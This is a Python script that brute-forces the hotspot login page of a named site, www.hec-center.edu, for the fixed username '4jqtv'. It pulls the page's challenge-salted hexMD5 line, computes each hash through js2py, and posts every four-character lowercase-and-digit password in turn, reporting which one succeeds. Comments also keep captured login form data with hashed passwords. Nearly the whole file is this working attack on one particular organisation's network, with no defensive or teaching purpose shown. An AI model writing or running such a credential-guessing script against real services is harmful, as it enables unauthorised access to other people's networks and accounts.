import itertools
import logging
import os
import string

import js2py
import requests

# These two lines enable debugging at httplib level (requests->urllib3->http.client)
# You will see the REQUEST, including HEADERS and DATA, and RESPONSE with HEADERS but without DATA.
# The only thing missing will be the response.body which is not logged.

# To enable debugging, uncomment the following
#
# try:
#     import http.client as http_client
# except ImportError:
#     # Python 2
#     import httplib as http_client
# http_client.HTTPConnection.debuglevel = 1

# # You must initialize logging, otherwise you'll not see debug output.
# logging.basicConfig()
# logging.getLogger().setLevel(logging.DEBUG)
# requests_log = logging.getLogger("requests.packages.urllib3")
# requests_log.setLevel(logging.DEBUG)
# requests_log.propagate = True

# username=4jqtv&password=c023ba7255a2db6bbef723897842389c&dst=&popup=true
# username=4jqtv&password=51a26eaccf8e2bebee205ec6c9d1d29a&dst=&popup=true


def js_md5(hash_function, password):
    dir_path = os.path.dirname(__file__)
    with open(os.path.join(dir_path, "md5.js"), "r") as file:
        js_script = file.read()

    # function_call = f"""
    # hexMD5('\\324' + '{password}' + '\\045\\147\\237\\137\\215\\307\\140\\244\\221\\106\\104\\245\\242\\364\\133\\305')
    # """

    function_call = hash_function.replace(
        "document.login.password.value", f"'{password}'"
    )

    js_script += function_call

    # print(js_script)
    # print(str(function_call))

    return js2py.eval_js(js_script)


# hash_value = js_md5("f888")
# print(hash_value)

debug_mode = False


def send_user_password(username, password):
    url = "http://www.hec-center.edu/login"

    # myobj = {"username": username, "password": "c22e4a15e4a6845f9167cf74fbc4079d-"}
    myobj = {"username": username, "password": password, "dst": "", "popup": "true"}
    if debug_mode:
        print(f"Trying to send user/password : {username}/{password}")
    # hexMD5('\\324'+ password + '\045\147\237\137\215\307\140\244\221\106\104\245\242\364\133\305')
    # hexMD5('\120' + password + '\156\123\154\144\032\174\072\061\320\000\116\264\216\247\273\143')
    # hexMD5('\310' + password + '\327\167\030\244\035\233\106\011\243\067\325\304\335\373\224\100')
    # hexMD5('\311' + password + '\005\317\167\107\170\005\012\164\345\226\155\331\242\133\272\105')
    x = requests.post(
        url,
        data=myobj,
        headers={
            "Host": "www.hec-center.edu",
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "72",
            "Origin": "http://www.hec-center.edu",
            "Connection": "keep-alive",
            "Referer": "http://www.hec-center.edu/login",
            "Upgrade-Insecure-Requests": "1",
        },
    )
    if debug_mode:
        print(f"response-headers: {x.headers}")
        print(f"response-status_code: {x.status_code}")
        print(f"response-cookies: {x.cookies}")

    return x.text


def get_hash_line():
    x = requests.post("http://www.hec-center.edu/login")
    response_text = x.text
    for line in response_text.splitlines():
        if "hexMD5(" in line:
            if debug_mode:
                print(line)
            return line
    return None


from datetime import datetime


def try_to_login(username, password):

    a = datetime.utcnow()
    response_text = send_user_password(username, password)
    b = datetime.utcnow()

    diff = f"{(b - a).seconds}.{(b - a).microseconds}"

    for line in response_text.splitlines():
        if "hexMD5(" in line:
            hexMD5_line = line

    if "You are logged in" in response_text:
        if debug_mode:
            print("Login successfully <You are logged in>\n\n", end="\n\n")
        return True, "", diff

    if "Please log on to use the internet hotspot service" in response_text:
        if debug_mode:
            print(
                f"Failed to login <Please log on to use the internet hotspot service>, hexMD5_line={hexMD5_line}\n\n",
                end="\n\n",
            )
        return False, hexMD5_line, diff

    print("Unknown state", end="\n\n")
    return False, hexMD5_line, diff


if __name__ == "__main__":

    hash_line = get_hash_line()
    if not hash_line:
        print("Failed to get hashline, exit")
        exit()

    username = "4jqtv"
    password = "tjx6"
    chars = string.ascii_lowercase + string.digits

    for tpossibility in itertools.product(chars, chars, chars, chars):
        password = "".join(tpossibility)

        if debug_mode:
            print(f"Trying password: {password}")

        hash_function = hash_line.split("=")[1]
        password_hash = js_md5(hash_function, password)
        if debug_mode:
            print(f"password_hash: {password_hash}")

        res, hash_line, timetotel = try_to_login(username, password_hash)
        print(password, res, timetotel)
